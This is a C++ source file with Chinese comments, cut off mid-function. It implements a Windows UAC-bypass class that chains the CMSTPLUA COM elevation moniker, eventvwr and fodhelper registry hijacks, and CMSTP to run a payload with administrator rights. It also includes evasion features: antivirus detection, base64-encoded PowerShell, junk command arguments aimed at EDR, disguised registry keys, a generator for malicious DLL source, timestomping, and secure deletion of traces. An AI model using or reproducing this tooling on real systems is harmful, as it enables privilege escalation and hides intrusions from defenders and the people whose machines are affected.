#pragma once
#define WIN32_LEAN_AND_MEAN

// 禁用特定的弃用警告
#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma warning(disable:4996)  // 禁用已弃用函数的警告

#include <windows.h>
#include <wintrust.h>
#include <softpub.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <comdef.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <random>
#include <chrono>
#include <thread>
#include <memory>
#include <wincrypt.h>
#include <bcrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <VersionHelpers.h>
#include <tchar.h>
#include <functional>
#include <cctype>
#include <lm.h>
#include <strsafe.h> 
#include <map>
#include "uacnew.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")

namespace fs = std::filesystem;

// 函数声明
bool DetectSecurityProcesses();
bool IsEnterpriseEdition();
bool IsDomainJoined();

// ===================== 替换已弃用的codecvt功能 =====================
std::string WideToUTF8(const std::wstring& wideStr) {
    if (wideStr.empty()) return "";

    int utf8Size = WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (utf8Size == 0) return "";

    std::string utf8Str(utf8Size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, &utf8Str[0], utf8Size, nullptr, nullptr);

    // 移除末尾的null字符
    if (!utf8Str.empty() && utf8Str.back() == '\0') {
        utf8Str.pop_back();
    }
    return utf8Str;
}

std::wstring UTF8ToWide(const std::string& utf8Str) {
    if (utf8Str.empty()) return L"";

    int wideSize = MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, nullptr, 0);
    if (wideSize == 0) return L"";

    std::wstring wideStr(wideSize, 0);
    MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, &wideStr[0], wideSize);

    // 移除末尾的null字符
    if (!wideStr.empty() && wideStr.back() == L'\0') {
        wideStr.pop_back();
    }
    return wideStr;
}

// ===================== 替换已弃用的GetVersionExW功能 =====================

bool IsWindows11OrGreater() {
    if (!IsWindows10OrGreater()) {
        return false;
    }

    // 检查构建版本号 (Windows 11从22000开始)
    OSVERSIONINFOEXW osvi = { sizeof(osvi), 0, 0, 0, 0, {0}, 0, 0, 0, 0 };
    DWORDLONG conditionMask = 0;

    osvi.dwBuildNumber = 22000;
    VER_SET_CONDITION(conditionMask, VER_BUILDNUMBER, VER_GREATER_EQUAL);

    return VerifyVersionInfoW(&osvi, VER_BUILDNUMBER, conditionMask);
}

bool CloneFileAttributes(const std::filesystem::path& sourcePath, const std::filesystem::path& targetPath) {
    // 1. 获取源文件属性（时间戳 + 属性标志）
    WIN32_FILE_ATTRIBUTE_DATA sourceAttrs;
    if (!GetFileAttributesExW(sourcePath.c_str(), GetFileExInfoStandard, &sourceAttrs)) {
        return false; // 源文件属性获取失败
    }

    // 2. 设置目标文件时间戳
    HANDLE hTarget = CreateFileW(
        targetPath.c_str(),
        FILE_WRITE_ATTRIBUTES,       // 仅需写属性权限
        FILE_SHARE_READ,             // 允许其他进程读取
        nullptr,
        OPEN_EXISTING,               // 目标文件必须已存在
        FILE_ATTRIBUTE_NORMAL,       // 临时取消属性避免冲突
        nullptr
    );
    if (hTarget == INVALID_HANDLE_VALUE) {
        return false;
    }

    // 3. 复制时间戳（创建/访问/修改时间）
    FILETIME creationTime = sourceAttrs.ftCreationTime;
    FILETIME lastAccessTime = sourceAttrs.ftLastAccessTime;
    FILETIME lastWriteTime = sourceAttrs.ftLastWriteTime;
    if (!SetFileTime(hTarget, &creationTime, &lastAccessTime, &lastWriteTime)) {
        CloseHandle(hTarget);
        return false;
    }
    CloseHandle(hTarget); // 时间戳设置完成后关闭句柄

    // 4. 复制文件属性标志（隐藏/只读/系统等）
    DWORD attributes = sourceAttrs.dwFileAttributes;
    if (!SetFileAttributesW(targetPath.c_str(), attributes)) {
        return false;
    }

    return true;
}

bool AppendFile(const fs::path& sourcePath, const fs::path& targetPath) {
    // 1. 检查源文件是否存在
    if (!fs::exists(sourcePath)) {
        return false;
    }

    // 2. 以二进制追加模式打开目标文件
    std::ofstream outFile(targetPath, std::ios::binary | std::ios::app);
    if (!outFile.is_open()) {
        return false;
    }

    // 3. 以二进制模式读取源文件
    std::ifstream inFile(sourcePath, std::ios::binary);
    if (!inFile.is_open()) {
        outFile.close();
        return false;
    }

    // 4. 使用缓冲区逐块复制内容（高效处理大文件）
    std::vector<char> buffer(4096); // 4KB缓冲区
    while (inFile.read(buffer.data(), buffer.size())) {
        outFile.write(buffer.data(), inFile.gcount()); // 写入实际读取的字节数
    }
    outFile.write(buffer.data(), inFile.gcount()); // 写入最后一块数据

    // 5. 关闭文件句柄
    inFile.close();
    outFile.close();
    return true;
}

// ===================== COM提权接口定义 =====================
typedef struct _ICMLuaUtil {
    void* lpVtbl;
} ICMLuaUtil;

typedef struct _ICMLuaUtilVtbl {
    HRESULT(__stdcall* QueryInterface)(ICMLuaUtil*, REFIID, void**);
    ULONG(__stdcall* AddRef)(ICMLuaUtil*);
    ULONG(__stdcall* Release)(ICMLuaUtil*);
    HRESULT(__stdcall* Method1)(ICMLuaUtil*);
    HRESULT(__stdcall* Method2)(ICMLuaUtil*);
    HRESULT(__stdcall* Method3)(ICMLuaUtil*);
    HRESULT(__stdcall* Method4)(ICMLuaUtil*);
    HRESULT(__stdcall* Method5)(ICMLuaUtil*);
    HRESULT(__stdcall* Method6)(ICMLuaUtil*);
    HRESULT(__stdcall* ShellExec)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, ULONG, ULONG);
    HRESULT(__stdcall* SetRegistryStringValue)(ICMLuaUtil*, HKEY, LPCTSTR, LPCTSTR, LPCTSTR);
} ICMLuaUtilVtbl;

// COM组件CLSID和IID
static const CLSID CLSID_CMSTPLUA = { 0x3E5FC7F9, 0x9A51, 0x4367, {0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7} };
static const IID IID_ICMLuaUtil = { 0x6EDD6D74, 0xC007, 0x4E75, {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C} };

// ===================== UAC绕过类 =====================
enum class UacMethod {
    FodHelper,
    EventViewer,
    CMSTPProtocol,
    ComHijack,
    Max
};

class UacmeBypass {
public:
    struct SystemInfo {
        bool isWin10;
        bool isWin11;
        bool isServer;
        DWORD uacLevel;
        bool hasRegProtection;
    };

    SystemInfo AnalyzeSystem();
    UacMethod ChooseBestMethod();
    std::wstring GetSystemDirectory();
    std::wstring GetRandomString(size_t len);
    std::wstring ObfuscateCommand(const fs::path& path);
    bool IsRegistryProtected(HKEY root, const std::wstring& subKey);
    bool VerifyMicrosoftSignature(const std::wstring& filePath);
    void CleanupAfterProcess(const std::wstring& procName, std::function<void()> action);
    bool SecureDelete(const fs::path& path);
    bool CreateMaliciousDll(const fs::path& payloadPath, const fs::path& dllPath);
    fs::path CreateTempFile(const std::wstring& baseExtension = L".tmp");
    bool CopyFileWithObfuscation(const fs::path& source, const fs::path& destination);
    void SetRandomFileTime(const fs::path& path);
    fs::path GetTempDirectory();
    bool BypassUac(UacMethod method, const fs::path& payload);
    bool AutoBypass(const fs::path& payload);
    fs::path GetCurrentProcessPath();

    // 新增方法：带重试机制的UAC绕过
    bool BypassUacWithRetry(UacMethod method, const fs::path& payload, int maxRetries = 3);
    bool AutoBypassWithRetry(const fs::path& payload, int maxRetriesPerMethod = 2);

private:
    bool Method_FodHelper(const fs::path& payload);
    bool Method_EventViewer(const fs::path& payload);
    bool Method_CMSTPProtocol(const fs::path& payload);
    bool Method_ComHijack(const fs::path& payload);  // COM接口提权方法
};

// ===================== 类方法实现 =====================
UacmeBypass::SystemInfo UacmeBypass::AnalyzeSystem() {
    SystemInfo info = {};

    info.isWin10 = IsWindows10OrGreater();
    info.isWin11 = IsWindows11OrGreater();
    info.isServer = IsWindowsServer();

    DWORD uacLevel = 0;
    DWORD size = sizeof(DWORD);
    RegGetValue(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"ConsentPromptBehaviorAdmin", RRF_RT_REG_DWORD, nullptr, &uacLevel, &size);
    info.uacLevel = uacLevel;

    info.hasRegProtection = IsRegistryProtected(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings") ||
        IsRegistryProtected(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile");

    return info;
}

UacMethod UacmeBypass::ChooseBestMethod() {
    SystemInfo sysInfo = AnalyzeSystem();

    // 1. 构建多维度系统特征向量（新增关键指标）
    struct {
        float osVersion;      // 系统版本权重 (Win11=1.0, Win10=0.8, 其他=0.5)
        bool hasRegProtection;
        DWORD uacLevel;       // UAC级别 (0-4, 越高限制越严)
        bool isEnterprise;    // 企业版系统
        bool hasAVProcess;    // 存在杀软进程
        bool isDomainJoined;  // 是否加域
    } envProfile = {
        .osVersion = sysInfo.isWin11 ? 1.0f : (sysInfo.isWin10 ? 0.8f : 0.5f),
        .hasRegProtection = sysInfo.hasRegProtection,
        .uacLevel = sysInfo.uacLevel,
        .isEnterprise = IsEnterpriseEdition(),
        .hasAVProcess = DetectSecurityProcesses(),
        .isDomainJoined = IsDomainJoined()
    };

    // 2. 为每种方法计算动态适应分（基于特征权重）
    auto ScoreMethod = [&](UacMethod method) -> float {
        // 基础分 = 方法固有成功率 * 环境兼容性
        float baseScore = 0.0f;
        switch (method) {
        case UacMethod::EventViewer:
            baseScore = (envProfile.osVersion > 0.9) ? 0.85 : 0.6;
            break;
        case UacMethod::ComHijack:
            baseScore = 0.92; // COM提权普遍有效
            break;
        case UacMethod::FodHelper:
            baseScore = (envProfile.osVersion > 0.7 && !envProfile.hasRegProtection) ? 0.78 : 0.4;
            break;
        case UacMethod::CMSTPProtocol:
            baseScore = (envProfile.uacLevel <= 2) ? 0.75 : 0.35;
            break;
        default: baseScore = 0.5;
        }

        // 风险惩罚分（检测概率 + 环境敏感度）
        float riskPenalty = 0.0f;
        if (envProfile.hasAVProcess) {
            // 存在杀软时EventViewer/FodHelper更易被拦截
            if (method == UacMethod::EventViewer || method == UacMethod::FodHelper)
                riskPenalty += 0.3f;
        }
        if (envProfile.isDomainJoined) {
            // 域环境中避免使用高日志记录的CMSTP
            if (method == UacMethod::CMSTPProtocol)
                riskPenalty += 0.25f;
        }

        return std::clamp(baseScore - riskPenalty, 0.1f, 1.0f); // 得分范围[0.1, 1.0]
        };

    // 3. 贝叶斯优化决策：平衡探索与利用
    static std::map<UacMethod, float> historicalSuccess; // 历史成功率缓存
    if (historicalSuccess.empty()) {
        // 初始化默认权重
        historicalSuccess = { {UacMethod::EventViewer, 0.8}, {UacMethod::ComHijack, 0.9},
                             {UacMethod::FodHelper, 0.7}, {UacMethod::CMSTPProtocol, 0.6} };
    }

    // 计算最终候选分 = 当前环境分 * 历史成功率
    std::vector<std::pair<UacMethod, float>> candidates;
    for (int i = 0; i < static_cast<int>(UacMethod::Max); ++i) {
        auto method = static_cast<UacMethod>(i);
        float finalScore = ScoreMethod(method) * historicalSuccess[method];
        candidates.emplace_back(method, finalScore);
    }

    // 按得分降序排序并选择最优方法
    std::sort(candidates.begin(), candidates.end(),
        [](auto& a, auto& b) { return a.second > b.second; });

    // 10%概率探索次优方法（避免模式固定化）
    if (rand() % 100 < 10 && candidates.size() > 1) {
        return candidates[1].first; // 选择第二名
    }
    return candidates[0].first; // 默认返回最优解
}

std::wstring UacmeBypass::GetSystemDirectory() {
    wchar_t sysDir[MAX_PATH];
    UINT result = ::GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring path = (result > 0) ? std::wstring(sysDir) : L"C:\\Windows\\System32";
    if (path.back() != L'\\') path += L'\\';
    return path;
}

std::wstring UacmeBypass::GetRandomString(size_t len) {
    static const wchar_t chars[] = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::wstring result;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, static_cast<int>(wcslen(chars) - 1));
    for (size_t i = 0; i < len; ++i)
        result += chars[dis(gen)];
    return result;
}

std::wstring UacmeBypass::ObfuscateCommand(const fs::path& path) {
    std::wstring cmd = L"\"" + path.wstring() + L"\"";
    DWORD encSize = 0;
    if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(cmd.c_str()),
        static_cast<DWORD>(cmd.size() * sizeof(wchar_t)),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL, &encSize)) {
        return cmd;
    }
    std::vector<wchar_t> buffer(encSize);
    if (CryptBinaryToStringW(reinterpret_cast<const BYTE*>(cmd.c_str()),
        static_cast<DWORD>(cmd.size() * sizeof(wchar_t)),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        buffer.data(), &encSize)) {
        return L"powershell -ep bypass -enc \"" + std::wstring(buffer.data()) + L"\"";
    }
    return cmd;
}

bool UacmeBypass::IsRegistryProtected(HKEY root, const std::wstring& subKey) {
    HKEY hKey;
    if (RegOpenKeyExW(root, subKey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;

    DWORD legacyDisable = 0, editFlags = 0;
    DWORD size = sizeof(DWORD);
    bool isProtected = false;
    if (RegQueryValueExW(hKey, L"LegacyDisable", NULL, NULL,
        reinterpret_cast<LPBYTE>(&legacyDisable), &size) == ERROR_SUCCESS && legacyDisable == 1)
        isProtected = true;
    if (RegQueryValueExW(hKey, L"EditFlags", NULL, NULL,
        reinterpret_cast<LPBYTE>(&editFlags), &size) == ERROR_SUCCESS && editFlags == 0x00010000)
        isProtected = true;

    RegCloseKey(hKey);
    return isProtected;
}

bool UacmeBypass::VerifyMicrosoftSignature(const std::wstring& filePath) {
    if (!fs::exists(filePath)) {
        return false;
    }

    const std::wstring sysDir = GetSystemDirectory();
    fs::path targetPath(filePath);
    if (targetPath.wstring().find(sysDir) == std::wstring::npos) {
        return false;
    }

    WINTRUST_FILE_INFO fileInfo = { sizeof(fileInfo) };
    fileInfo.pcwszFilePath = filePath.c_str();

    WINTRUST_DATA trustData = { sizeof(trustData) };
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_WHOLECHAIN;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;

    GUID actionGuid = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    LONG lStatus = WinVerifyTrust(nullptr, &actionGuid, &trustData);

    bool isValid = false;
    if (lStatus == ERROR_SUCCESS) {
        CRYPT_PROVIDER_DATA* pProvData = WTHelperProvDataFromStateData(trustData.hWVTStateData);
        if (pProvData && pProvData->csSigners > 0) {
            PCRYPT_PROVIDER_SGNR pSigner = pProvData->pasSigners;
            if (pSigner->csCertChain > 0) {
                PCCERT_CONTEXT pCertContext = pSigner->pasCertChain[0].pCert;
                DWORD nameLen = CertGetNameStringW(pCertContext,
                    CERT_NAME_SIMPLE_DISPLAY_TYPE,
                    0, nullptr, nullptr, 0);

                if (nameLen > 1) {
                    std::wstring subjectName(nameLen, L'\0');
                    CertGetNameStringW(pCertContext,
                        CERT_NAME_SIMPLE_DISPLAY_TYPE,
                        0, nullptr, &subjectName[0], nameLen);
                    isValid = (subjectName.find(L"Microsoft Corporation") != std::wstring::npos);
                }
            }
        }
    }

    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(nullptr, &actionGuid, &trustData);

    return isValid;
}

void UacmeBypass::CleanupAfterProcess(const std::wstring& procName, std::function<void()> action) {
    std::thread([this, procName, action]() {
        DWORD pid = 0;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return;

        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, procName.c_str()) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);

        if (pid != 0) {
            HANDLE hProc = OpenProcess(SYNCHRONIZE, FALSE, pid);
            if (hProc) {
                WaitForSingleObject(hProc, INFINITE);
                CloseHandle(hProc);
                action();
            }
        }
        }).detach();
}

bool UacmeBypass::SecureDelete(const fs::path& path) {
    if (!fs::exists(path)) return true;

    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        return false;
    }

    const DWORD bufferSize = 4096;
    std::vector<char> junkData(bufferSize);
    DWORD bytesWritten;

    for (int i = 0; i < 3; i++) {
        SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);

        LONGLONG remaining = fileSize.QuadPart;
        while (remaining > 0) {
            DWORD writeSize = (remaining > bufferSize) ? bufferSize : static_cast<DWORD>(remaining);
            std::generate(junkData.begin(), junkData.begin() + writeSize,
                []() { return rand() % 256; });

            if (!WriteFile(hFile, junkData.data(), writeSize, &bytesWritten, nullptr) ||
                bytesWritten != writeSize) {
                CloseHandle(hFile);
                return false;
            }
            remaining -= writeSize;
        }
        FlushFileBuffers(hFile);
    }

    CloseHandle(hFile);
    return DeleteFileW(path.c_str());
}

bool UacmeBypass::CreateMaliciousDll(const fs::path& payloadPath, const fs::path& dllPath) {
    fs::create_directories(dllPath.parent_path());

    // 使用新的WideToUTF8函数替换已弃用的codecvt
    std::string payloadStr = WideToUTF8(payloadPath.wstring());

    std::string dllCode = R"(
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system(")";
    dllCode += payloadStr;
    dllCode += R"(");
    }
    return TRUE;
})";

    std::ofstream dllFile(dllPath, std::ios::binary);
    if (!dllFile) {
        return false;
    }
    dllFile.write(dllCode.data(), dllCode.size());
    return dllFile.good();
}

fs::path UacmeBypass::CreateTempFile(const std::wstring& baseExtension) {
    wchar_t tempDir[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempDir)) {
        return L"C:\\Windows\\Temp\\tempfile.tmp";
    }

    fs::create_directories(tempDir);

    const wchar_t* fakeExtensions[] = { L".log", L".ini", L".dmp", L".bin", L".bak" };
    auto extension = fakeExtensions[rand() % (sizeof(fakeExtensions) / sizeof(fakeExtensions[0]))];

    for (int i = 0; i < 10; ++i) {
        std::wstring fileName = GetRandomString(12) + extension;
        fs::path tempFile = fs::path(tempDir) / fileName;

        if (!fs::exists(tempFile)) {
            std::ofstream testFile(tempFile);
            if (testFile) {
                testFile.close();
                return tempFile;
            }
        }
    }
    return fs::path();
}

bool UacmeBypass::CopyFileWithObfuscation(const fs::path& source, const fs::path& destination) {
    fs::create_directories(destination.parent_path());

    std::ifstream srcFile(source, std::ios::binary);
    if (!srcFile) return false;

    size_t junkSize = static_cast<size_t>(rand() % 512 + 256);
    std::vector<char> junkData(junkSize);
    std::generate(junkData.begin(), junkData.end(), []() { return rand() % 256; });

    std::ofstream dstFile(destination, std::ios::binary);
    if (!dstFile) return false;

    dstFile.write(junkData.data(), static_cast<std::streamsize>(junkData.size()));
    dstFile << srcFile.rdbuf();
    return true;
}

void UacmeBypass::SetRandomFileTime(const fs::path& path) {
    FILETIME ftCreation, ftLastWrite;
    SYSTEMTIME st;

    GetSystemTime(&st);
    st.wYear = st.wYear - (rand() % 5) - 1;
    st.wMonth = rand() % 12 + 1;
    st.wDay = rand() % 28 + 1;
    st.wHour = rand() % 24;
    st.wMinute = rand() % 60;

    SystemTimeToFileTime(&st, &ftCreation);
    SystemTimeToFileTime(&st, &ftLastWrite);

    HANDLE hFile = CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
        SetFileTime(hFile, &ftCreation, nullptr, &ftLastWrite);
        CloseHandle(hFile);
    }
}

fs::path UacmeBypass::GetTempDirectory() {
    wchar_t path[MAX_PATH];
    return (GetTempPathW(MAX_PATH, path) > 0) ? fs::path(path) : L"C:\\Windows\\Temp\\";
}

bool UacmeBypass::BypassUac(UacMethod method, const fs::path& payload) {
    switch (method) {
    case UacMethod::FodHelper:     return Method_FodHelper(payload);
    case UacMethod::EventViewer:   return Method_EventViewer(payload);
    case UacMethod::CMSTPProtocol: return Method_CMSTPProtocol(payload);
    case UacMethod::ComHijack:     return Method_ComHijack(payload);
    default: return false;
    }
}

// 新增：带重试机制的UAC绕过方法
bool UacmeBypass::BypassUacWithRetry(UacMethod method, const fs::path& payload, int maxRetries) {
    for (int attempt = 1; attempt <= maxRetries; attempt++) {
        std::wcout << L"尝试方法 " << static_cast<int>(method) << L"，第 " << attempt << L" 次尝试..." << std::endl;

        bool result = BypassUac(method, payload);

        if (result) {
            std::wcout << L"方法 " << static_cast<int>(method) << L" 在第 " << attempt << L" 次尝试中成功" << std::endl;
            return true;
        }

        std::wcout << L"方法 " << static_cast<int>(method) << L" 第 " << attempt << L" 次尝试失败" << std::endl;

        // 如果不是最后一次尝试，等待一段时间再重试
        if (attempt < maxRetries) {
            int delayMs = 1000 * attempt; // 每次重试等待时间递增
            std::wcout << L"等待 " << delayMs << L" 毫秒后重试..." << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
        }
    }

    return false;
}

bool UacmeBypass::AutoBypass(const fs::path& payload) {
    const std::vector<UacMethod> methods = {
        UacMethod::ComHijack,
        UacMethod::CMSTPProtocol,
        UacMethod::EventViewer,
        UacMethod::FodHelper
    };

    for (const auto& method : methods) {
        if (BypassUac(method, payload)) {
            return true;
        }
    }
    return false;
}

// 新增：带重试机制的自动绕过
bool UacmeBypass::AutoBypassWithRetry(const fs::path& payload, int maxRetriesPerMethod) {
    // 根据系统环境选择最佳方法
    UacMethod bestMethod = ChooseBestMethod();
    std::wcout << L"选择的最佳方法: " << static_cast<int>(bestMethod) << std::endl;

    // 首先尝试最佳方法（带重试）
    if (BypassUacWithRetry(bestMethod, payload, maxRetriesPerMethod)) {
        return true;
    }

    std::wcout << L"最佳方法失败，尝试所有可用方法..." << std::endl;

    // 如果最佳方法失败，尝试所有方法
    const std::vector<UacMethod> allMethods = {
        UacMethod::ComHijack,
        UacMethod::CMSTPProtocol,
        UacMethod::EventViewer,
        UacMethod::FodHelper
    };

    for (const auto& method : allMethods) {
        if (method == bestMethod) continue; // 已经尝试过最佳方法

        if (BypassUacWithRetry(method, payload, maxRetriesPerMethod)) {
            return true;
        }
    }

    return false;
}

// ===================== COM提权核心方法 =====================
bool UacmeBypass::Method_ComHijack(const fs::path& payload) {
    // 使用COM Elevation Moniker技术提权
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 2000));

    // 构造提升权限名字字符串
    WCHAR wszCLSID[50];
    StringFromGUID2(CLSID_CMSTPLUA, wszCLSID, ARRAYSIZE(wszCLSID));
    WCHAR monikerName[300];
    StringCchPrintf(monikerName, ARRAYSIZE(monikerName),
        L"Elevation:Administrator!new:%s", wszCLSID);

    // 初始化COM
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr)) return false;

    // 设置绑定选项
    BIND_OPTS3 bindOpts = { sizeof(bindOpts) };
    bindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
    bindOpts.hwnd = GetDesktopWindow();

    // 获取ICMLuaUtil接口
    ICMLuaUtil* pCMLuaUtil = nullptr;
    hr = CoGetObject(
        monikerName,
        &bindOpts,
        IID_ICMLuaUtil,
        (void**)&pCMLuaUtil
    );

    // 执行payload
    if (SUCCEEDED(hr) && pCMLuaUtil) {
        // 获取虚函数表
        ICMLuaUtilVtbl* vtbl = (ICMLuaUtilVtbl*)pCMLuaUtil->lpVtbl;

        // 使用cmd.exe作为执行载体，Payload作为参数（保留混淆）
        std::wstring cmdExe = GetSystemDirectory() + L"cmd.exe";

        // 随机参数混淆EDR检测（保留原有混淆机制）
        std::wstring randomParam1 = L"/" + GetRandomString(4) + L"=" + GetRandomString(8);
        std::wstring randomParam2 = L"/" + GetRandomString(3) + L"=" + GetRandomString(6);

        // 构建混淆的命令行
        std::wstring obfuscatedCmd = L"/c \"set " + GetRandomString(4) + L"= && " +
            ObfuscateCommand(payload) + L" " + randomParam1 + L" " + randomParam2 + L"\"";

        // 调用ShellExec执行cmd.exe并传递混淆后的Payload命令
        hr = vtbl->ShellExec(
            pCMLuaUtil,
            cmdExe.c_str(),         // 使用cmd.exe作为可执行文件
            obfuscatedCmd.c_str(),  // 混淆后的Payload命令作为参数
            NULL,
            SEE_MASK_NO_CONSOLE,
            SW_HIDE
        );

        // 释放COM对象
        vtbl->Release(pCMLuaUtil);
    }

    CoUninitialize();
    return SUCCEEDED(hr);
}
// ===================== 其他UAC绕过方法 =====================
bool UacmeBypass::Method_EventViewer(const fs::path& payload) {
    const std::wstring targetExe = GetSystemDirectory() + L"eventvwr.exe";
    if (!VerifyMicrosoftSignature(targetExe))
        return false;

    // 使用随机注册表键名（保留混淆）
    std::wstring randomKey = L"mscfile_" + GetRandomString(8);
    const std::wstring regPath = L"Software\\Classes\\" + randomKey + L"\\shell\\open\\command";

    if (IsRegistryProtected(HKEY_CURRENT_USER, regPath.substr(0, regPath.find_last_of('\\'))))
        return false;

    // 使用cmd.exe执行Payload（保留混淆机制）
    std::wstring randomEnvVar = GetRandomString(4);
    std::wstring cmd = L"cmd.exe /c \"set " + randomEnvVar + L"= && " +
        ObfuscateCommand(payload) + L" && set " + randomEnvVar + L"=\"";

    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL,
        REG_OPTION_VOLATILE | REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(cmd.c_str()), static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);

    // 创建快捷方式启动eventvwr（保留原有机制）
    fs::path lnkPath = GetTempDirectory() / (GetRandomString(8) + L".lnk");
    IShellLinkW* psl;
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) {
        psl->SetPath(targetExe.c_str());
        psl->SetArguments((L"/v " + randomKey).c_str());

        IPersistFile* ppf;
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
            ppf->Save(lnkPath.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    }

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = lnkPath.c_str();
    sei.nShow = SW_HIDE;
    bool result = ShellExecuteExW(&sei);

    CleanupAfterProcess(L"eventvwr.exe", [this, regPath, lnkPath]() {
        RegDeleteKeyW(HKEY_CURRENT_USER, regPath.c_str());
        SecureDelete(lnkPath);
        });
    return result;
}
bool UacmeBypass::Method_FodHelper(const fs::path& payload) {
    // 1. 动态生成高迷惑性注册表键名（伪装为VPN配置，保留混淆）
    std::wstring randomKey = L"VPNConfig_" + GetRandomString(10);
    std::wstring fullRegPath = L"Software\\Classes\\" + randomKey + L"\\Shell\\Open\\command";

    // 2. 混淆命令：通过Base64编码 + 环境变量注入（保留原有混淆机制）
    std::wstring randomEnvVar = GetRandomString(4);
    std::wstring cmd = L"cmd.exe /c \"set " + randomEnvVar + L"= && " +
        ObfuscateCommand(payload) + L" && set " + randomEnvVar + L"=\"";

    // 3. 注册表操作强化（添加伪造签名降低EDR警觉性，保留原有机制）
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, fullRegPath.c_str(), 0, NULL,
        REG_OPTION_VOLATILE | REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    // 设置合法外观的默认值（模仿微软签名程序）
    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(L"\"C:\\Program Files\\Common Files\\VPNClient\\vpnui.exe\""),
        68 * sizeof(wchar_t));

    // 延迟触发：添加随机睡眠参数干扰行为分析
    RegSetValueExW(hKey, L"SleepDelay", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(std::to_wstring(rand() % 1500 + 500).c_str()),
        8 * sizeof(wchar_t));

    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(L""), sizeof(wchar_t));
    RegCloseKey(hKey);

    // 4. 文件操作深度混淆（保留原有机制）
    fs::path fodhelperPath = GetSystemDirectory() + L"fodhelper.exe";
    std::wstring fakeName = L"wlansvc_" + GetRandomString(4) + L".log"; // 伪装网络服务日志
    fs::path tempFodhelper = GetTempDirectory() / fakeName;

    // 注入垃圾数据破坏静态特征（前1KB填充随机数据）
    std::vector<BYTE> junkData(1024);
    std::generate(junkData.begin(), junkData.end(), []() { return rand() % 256; });
